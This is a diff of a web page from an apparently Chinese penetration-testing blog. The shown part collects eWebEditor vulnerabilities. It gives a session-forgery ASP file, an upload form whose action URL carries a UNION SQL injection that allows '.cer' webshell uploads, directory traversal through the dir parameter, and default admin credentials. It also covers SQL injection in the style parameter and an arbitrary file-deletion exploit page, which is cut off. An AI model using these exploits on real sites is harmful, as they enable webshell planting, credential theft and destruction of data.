@@ -6,19 +6,19 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://budebao.github.io">
-  <title>fck文件编辑器漏洞 | 零点维度</title>
+  <title>ewebeditor在线编辑器漏洞 | 零点维度</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
   <meta name="description" content="##1:默认管理后台:http://127.0.0.1/ewebeditor/admin_login.asp后台如果能进入:">
 <meta name="keywords" content="渗透测试">
 <meta property="og:type" content="article">
-<meta property="og:title" content="fck文件编辑器漏洞">
+<meta property="og:title" content="ewebeditor在线编辑器漏洞">
 <meta property="og:url" content="http://budebao.github.io/2018/03/21/ewebeditor在线编辑器漏洞/index.html">
 <meta property="og:site_name" content="零点维度">
 <meta property="og:description" content="##1:默认管理后台:http://127.0.0.1/ewebeditor/admin_login.asp后台如果能进入:">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-04-11T12:20:56.476Z">
+<meta property="og:updated_time" content="2018-04-11T12:26:29.724Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="fck文件编辑器漏洞">
+<meta name="twitter:title" content="ewebeditor在线编辑器漏洞">
 <meta name="twitter:description" content="##1:默认管理后台:http://127.0.0.1/ewebeditor/admin_login.asp后台如果能进入:">
   
     <link rel="alternative" href="/atom.xml" title="零点维度" type="application/atom+xml">
@@ -162,7 +162,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      fck文件编辑器漏洞
+      ewebeditor在线编辑器漏洞
     </h1>
   
 
@@ -180,7 +180,7 @@
 <p>##3.eWebEditor session欺骗漏洞<br>eWebEditor在线编辑器<br>漏洞文件:Admin_Private.asp<br>漏洞语句:&lt;%<br>If Session(“eWebEditor_User”) = “” Then<br>Response.Redirect “admin_login.asp”<br>Response.End<br>End If<br>只判断了session，没有判断cookies和路径的验证问题。<br>漏洞利用:<br>新建一个h4x0r.asp内容如下:<br>&lt;%Session(“eWebEditor_User”) = “11111111”%&gt;<br>访问h4x0r.asp，再访问后台任何文件，for example:Admin_Default.asp<br>漏洞影响:虚拟主机的克星.</p>
 <p>##4.ewebeditor asp版 2.1.6 上传漏洞<br>    </p><h1>ewebeditor asp版 2.1.6 上传漏洞利用程序</h1><br><br>    <form action="”http://127.1/e/upload.asp?action=save&type=IMAGE&style=luoye’" union="" select="" s_id,s_name,s_dir,s_css,s_uploaddir,s_width,s_height,s_memo,s_issys,s_fileext,s_flashext,="" [s_imageext]%2b’|cer’,s_mediaext,s_filesize,s_flashsize,s_imagesize,s_mediasize,s_stateflag,s_detectfromword,s_initmode,s_baseurl="" from="" ewebeditor_style="" where="" s_name="’standard’and’a’=’a”" method="post" name="myform" enctype="”multipart/form-data”"><br>    <input type="file" name="uploadfile" size="100"><br><br><br>    <input type="submit" value="Fuck"><br>    </form><br><a href="http://127.1/e/upload.asp" target="_blank" rel="noopener">http://127.1/e/upload.asp</a><br>上传时修改此处上传地址。。。<br>如果你是上传的asp文件则成功后的地址为：<br><a href="http://127.1/e/uploadfile/xxxxxxxxxx.asp" target="_blank" rel="noopener">http://127.1/e/uploadfile/xxxxxxxxxx.asp</a><br>—————————————————————————–<p></p>
 <p>##5.ewebeditor遍历路径漏洞<br>Ewebeditor为非常常见的网站核心程序,<br>默认数据库为 /db/ewebeditor.mdb 默认路径admin_login.asp 默认管理员admin密码admin(admin888)<br>ewebedit进入后台添加样式.得到webshell很容易. 有时候很不幸.管理员把数据库改为只读权限.<br>但是ewebeditor后台有个小小的缺陷. 可以历遍整个网站目录. 当然.数据库为只读的时候一样可以利用.<br>上传文件管理—选择样式目录(随便选一个目录)<br>得到:<br>ewebeditor/admin_uploadfile.asp?id=14<br>在id=14后面添加&amp;dir=..<br>再加 &amp;dir=../..<br>&amp;dir=../../../.. 看到整个网站文件了<br>—————————————————————————–</p>
-<p>##6.eweb2.7版本以下又一个注入<br>首先看代码(ewebeditor.asp)：<br>    ub InitPara()<br>    ‘ 取全屏标志<br>    sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>    ‘ 取对应的内容ID<br>    sContentID = Trim(Request.QueryString(“id”))<br>    If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”<br>    ‘ 取样式初始值<br>    sStyleName = Trim(Request.QueryString(“style”))<br>    If sStyleName = “” Then sStyleName = “standard”<br>    sSql = “select <em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>    oRs.Open sSql, oConn, 0, 1<br>    If Not oRs.Eof Then<br>    sStyleID = oRs(“S_ID”)<br>    sStyleName = oRs(“S_Name”)<br>    sStyleDir = oRs(“S_Dir”)<br>    sStyleCSS = oRs(“S_CSS”)<br>    sStyleUploadDir = oRs(“S_UploadDir”)<br>    nStateFlag = oRs(“S_StateFlag”)<br>    sDetectFromWord = oRs(“S_DetectFromWord”)<br>    sInitMode = oRs(“S_InitMode”)<br>    sBaseUrl = oRs(“S_BaseUrl”)<br>    sStyleUploadDir = Replace(sStyleUploadDir, “”, “/”)<br>    If Right(sStyleUploadDir, 1) &lt;&gt; “/” Then<br>    sStyleUploadDir = sStyleUploadDir &amp; “/”<br>    End If<br>    Else<br>    ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>    End If<br>    oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”<br>sSql = “select </em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，<br>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，<br>—————————————————————————–</p>
+<p>##6.eweb2.7版本以下又一个注入<br>    首先看代码(ewebeditor.asp)：<br>    ub InitPara()<br>    ‘ 取全屏标志<br>    sFullScreen = Trim(Request.QueryString(“fullscreen”))<br>    ‘ 取对应的内容ID<br>    sContentID = Trim(Request.QueryString(“id”))<br>    If sContentID = “” Then ShowErr “请传入调用参数ID，即隐藏的内容表单项ID！”<br>    ‘ 取样式初始值<br>    sStyleName = Trim(Request.QueryString(“style”))<br>    If sStyleName = “” Then sStyleName = “standard”<br>    sSql = “select <em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>    oRs.Open sSql, oConn, 0, 1<br>    If Not oRs.Eof Then<br>    sStyleID = oRs(“S_ID”)<br>    sStyleName = oRs(“S_Name”)<br>    sStyleDir = oRs(“S_Dir”)<br>    sStyleCSS = oRs(“S_CSS”)<br>    sStyleUploadDir = oRs(“S_UploadDir”)<br>    nStateFlag = oRs(“S_StateFlag”)<br>    sDetectFromWord = oRs(“S_DetectFromWord”)<br>    sInitMode = oRs(“S_InitMode”)<br>    sBaseUrl = oRs(“S_BaseUrl”)<br>    sStyleUploadDir = Replace(sStyleUploadDir, “”, “/”)<br>    If Right(sStyleUploadDir, 1) &lt;&gt; “/” Then<br>    sStyleUploadDir = sStyleUploadDir &amp; “/”<br>    End If<br>    Else<br>    ShowErr “无效的样式Style参数传入，如果要使用默认值，请留空！”<br>    End If<br>    oRs.Close<br>关键的是这两句：<br>sStyleName = Trim(Request.QueryString(“style”))<br>If sStyleName = “” Then sStyleName = “standard”<br>sSql = “select </em> from ewebeditor_style where s_name=’” &amp; sStyleName &amp; “‘”<br>很明显的是style参数没有足够的过滤，如果我们自己给这个地方赋值的话，程序会报错的，<br>但接下来的一句还是让我们有可乘之机，If sStyleName = “” Then sStyleName = “standard”保留默认的还是会带入语句执行，加个单引号就报错了，如图2.[local]1[/local]<br>我试了好几款工具，发现只有pangolin可以注入，啊D只能发现注入不能继续猜解。<br>eweb默认的管理员表是：ewebeditor_system<br>这个表下的默认两个列名为:sys_UserName和sys_userpass<br>需要手动添加，<br>—————————————————————————–</p>
 <p>##7.ewebeditor2.8最终版删除任意文件漏洞<br>这个漏洞可以很鸡肋，也可以很致命，关键看你怎么利用！<br>此漏洞存在于ExampleNewsSystem目录下的delete.asp文件中，这是ewebeditor的测试页面，无须登陆可以直接进入，看这些代码：<br>‘ 把带”|”的字符串转为数组<br>Dim aSavePathFileName<br>aSavePathFileName = Split(sSavePathFileName, “|”)<br>‘ 删除新闻相关的文件，从文件夹中<br>Dim i<br>For i = 0 To UBound(aSavePathFileName)<br>‘ 按路径文件名删除文件<br>Call DoDelFile(aSavePathFileName(i))<br>Next<br>而aSavePathFileName是前面从数据库取出来的：<br>sSavePathFileName = oRs(“D_SavePathFileName”)<br>看看D_SavePathFileName是怎么添加到数据库里的，在addsave.asp(modifysave.asp)里：<br>sSavePathFileName = GetSafeStr(Request.Form(“d_savepathfilename”))<br>…<br>oRs(“D_SavePathFileName”) = sSavePathFileName<br>居然过滤了，是GetSafeStr函数，再看看这个函数，在Startup.asp里：<br>Function GetSafeStr(str)<br>GetSafeStr = Replace(Replace(Replace(Trim(str), “‘”, “”), Chr(34), “”), “;”, “”)<br>End Function<br>无语，这不是过滤字符型注入的函数么？放这里什么用也没有啊！既然路径没有过滤，那就可以直接定义了，构造一个提交页面，其中d_savepathfilename自己任意赋值(要删除多个文件，用|隔开即可)。试试../../eWebEditor.asp，提交后删除该新闻，于是主目录下的eWebEditor.asp不见了！<br>下面给出利用的htm：<br>    <code>&lt;HTML&gt;&lt;HEAD&gt;&lt;TITLE&gt;eWebEditor删除文件 by:oldjun(http://www.oldjun.com)&lt;/TITLE&gt;
     &lt;style&gt;body,p,td,input {font-size:9pt}&lt;/style&gt;
     &lt;/HEAD&gt;&lt;BODY&gt;&lt;a href=’list.asp’&gt;新闻列表&lt;/a&gt; | &lt;a href=’add.asp’&gt;增加新闻&lt;/a&gt;
